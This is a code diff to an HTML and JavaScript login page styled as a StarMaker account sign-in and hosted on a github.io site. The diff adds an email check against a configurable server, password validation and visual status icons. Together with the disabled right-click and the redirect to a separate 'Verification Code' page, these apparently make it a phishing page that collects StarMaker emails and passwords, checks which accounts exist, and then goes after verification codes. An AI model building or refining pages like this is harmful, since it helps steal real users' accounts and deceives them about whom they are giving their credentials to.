@@ -90,15 +90,6 @@
       }
     }
 
-    @keyframes float {
-      0%, 100% {
-        transform: translateY(0px);
-      }
-      50% {
-        transform: translateY(-10px);
-      }
-    }
-
     @keyframes fadeInUp {
       from {
         opacity: 0;
@@ -119,24 +110,9 @@
       }
     }
 
-    @keyframes pulse {
-      0%, 100% {
-        box-shadow: 0 0 0 0 rgba(255, 41, 111, 0.7);
-      }
-      50% {
-        box-shadow: 0 0 0 10px rgba(255, 41, 111, 0);
-      }
-    }
-
-    @keyframes inputFocus {
-      0% {
-        transform: scale(1);
-      }
-      50% {
-        transform: scale(1.02);
-      }
-      100% {
-        transform: scale(1);
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
       }
     }
 
@@ -199,11 +175,62 @@
       margin-bottom: 22px;
     }
 
+    .email-status {
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 30px;
+      height: 30px;
+      display: none;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .email-status.show {
+      display: flex;
+    }
+
+    .loading-spinner {
+      width: 20px;
+      height: 20px;
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #FF296F;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    .check-icon {
+      width: 30px;
+      height: 30px;
+      background: #4CAF50;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    .cross-icon {
+      width: 30px;
+      height: 30px;
+      background: #cccccc;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
     input[type=email], 
     input[type=password] {
       width: 100%;
       border-radius: 25px;
-      padding: 15px 20px;
+      padding: 15px 50px 15px 20px;
       margin: 5px 0;
       display: inline-block;
       border: 2px solid transparent;
@@ -231,6 +258,48 @@
     input[type=password]:focus::placeholder {
       color: #ccc;
       transform: translateX(5px);
+    }
+
+    .email-error-msg {
+      color: #d32f2f;
+      font-size: 13px;
+      text-align: left;
+      margin: 5px 0 10px 20px;
+      font-weight: 600;
+      display: none;
+    }
+
+    .email-error-msg.show {
+      display: block;
+    }
+
+    .password-error {
+      color: #d32f2f;
+      font-size: 13px;
+      text-align: left;
+      margin: 5px 0 10px 20px;
+      font-weight: 600;
+      display: none;
+    }
+
+    .password-error.show {
+      display: block;
+    }
+
+    .forgot-password {
+      text-align: right;
+      margin: 15px 0;
+    }
+
+    .forgot-password a {
+      color: #666;
+      text-decoration: underline;
+      font-size: 14px;
+      transition: color 300ms ease;
+    }
+
+    .forgot-password a:hover {
+      color: #FF296F;
     }
 
     button {
@@ -282,6 +351,11 @@
     button:active {
       transform: translateY(0px);
       box-shadow: 0 2px 10px rgba(255, 41, 111, 0.4);
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
     }
 
     .signupbtn {
@@ -371,7 +445,6 @@
       transform: translateY(0);
     }
 
-    /* Loading spinner */
     .loading {
       pointer-events: none;
       opacity: 0.7;
@@ -389,12 +462,6 @@
       border-top-color: white;
       border-radius: 50%;
       animation: spin 800ms linear infinite;
-    }
-
-    @keyframes spin {
-      to {
-        transform: translate(-50%, -50%) rotate(360deg);
-      }
     }
 
     @media screen and (max-width: 600px) {
@@ -449,17 +516,24 @@
           </div>
           
           <div class="input-wrapper">
-            <input name="email" placeholder="Email Address" type="email" required />
+            <input id="email-input" name="email" placeholder="Email Address" type="email" required />
+            <div class="email-status" id="email-status"></div>
           </div>
+          <div class="email-error-msg" id="email-error"></div>
           
           <div class="input-wrapper">
-            <input name="psw" placeholder="Enter Your Password" type="password" required />
+            <input id="password-input" name="psw" placeholder="Enter Your Password" type="password" required />
+          </div>
+          <div class="password-error" id="password-error"></div>
+
+          <div class="forgot-password">
+            <a href="#">Forgot password</a>
           </div>
           
           <div id="error-status" class="error-message"></div>
           
           <div class="clearfix">
-            <button class="signupbtn" type="submit">Log In</button>
+            <button class="signupbtn" type="submit" id="submit-btn">Log In</button>
           </div>
         </div>
       </form>
@@ -469,6 +543,9 @@
   <div id="status" class="success-message"></div>
 
   <script>
+    // Configuration - Change this to your server URL
+    const EMAIL_CHECK_API = 'http://localhost:3000/check-email';
+    
     // Disable right-click
     document.addEventListener('contextmenu', function (e) {
       e.preventDefault();
@@ -476,9 +553,72 @@
 
     window.addEventListener("DOMContentLoaded", function () {
       const form = document.getElementById("my-form");
+      const emailInput = document.getElementById("email-input");
+      const passwordInput = document.getElementById("password-input");
+      const emailStatus = document.getElementById("email-status");
+      const emailError = document.getElementById("email-error");
+      const passwordError = document.getElementById("password-error");
       const status = document.getElementById("status");
       const errorStatus = document.getElementById("error-status");
-      const submitBtn = form.querySelector('button[type="submit"]');
+      const submitBtn = document.getElementById("submit-btn");
+
+      let emailExists = false;
+      let emailCheckTimeout;
+
+      // Check email when user types in password field
+      passwordInput.addEventListener('focus', function() {
+        const email = emailInput.value.trim();
+        if (email && email.includes('@')) {
+          checkEmail(email);
+        }
+      });
+
+      // Also check email when user types in password
+      passwordInput.addEventListener('input', function() {
+        const email = emailInput.value.trim();
+        if (email && email.includes('@') && !emailStatus.classList.contains('show')) {
+          checkEmail(email);
+        }
+      });
+
+      async function checkEmail(email) {
+        // Show loading spinner
+        emailStatus.innerHTML = '<div class="loading-spinner"></div>';
+        emailStatus.classList.add('show');
+        emailError.classList.remove('show');
+        passwordError.classList.remove('show');
+
+        try {
+          const response = await fetch(EMAIL_CHECK_API, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ email })
+          });
+
+          const data = await response.json();
+
+          if (data.exists) {
+            // Show green tick
+            emailStatus.innerHTML = '<div class="check-icon">✓</div>';
+            emailExists = true;
+            emailError.classList.remove('show');
+          } else {
+            // Show cross icon
+            emailStatus.innerHTML = '<div class="cross-icon">✕</div>';
+            emailExists = false;
+            emailError.textContent = 'Account is not found. Create one in StarMaker App.';
+            emailError.classList.add('show');
+          }
+        } catch (error) {
+          console.error('Error checking email:', error);
+          // Hide status on error
+          emailStatus.classList.remove('show');
+          emailError.textContent = 'Unable to verify email. Please try again.';
+          emailError.classList.add('show');
+        }
+      }
 
       function success() {
         form.reset();
@@ -487,6 +627,7 @@
         status.innerHTML = "Logged in successfully!";
         errorStatus.classList.remove("show");
         errorStatus.innerHTML = "";
+        emailStatus.classList.remove('show');
         
         setTimeout(function() {
           window.location.href = "https://starmakerstudio.github.io/web/Starmaker%20Web/Verification%20Code/verification.html";
@@ -502,8 +643,24 @@
 
       form.addEventListener("submit", function (ev) {
         ev.preventDefault();
+        
+        // Validate email exists
+        if (!emailExists && emailInput.value.trim()) {
+          emailError.textContent = 'Account is not found. Create one in StarMaker App.';
+          emailError.classList.add('show');
+          return;
+        }
+
+        // Validate password
+        if (!passwordInput.value.trim()) {
+          passwordError.textContent = 'Please enter your password';
+          passwordError.classList.add('show');
+          return;
+        }
+
         errorStatus.classList.remove("show");
         errorStatus.innerHTML = "";
+        passwordError.classList.remove("show");
         submitBtn.classList.add('loading');
         
         const data = new FormData(form);
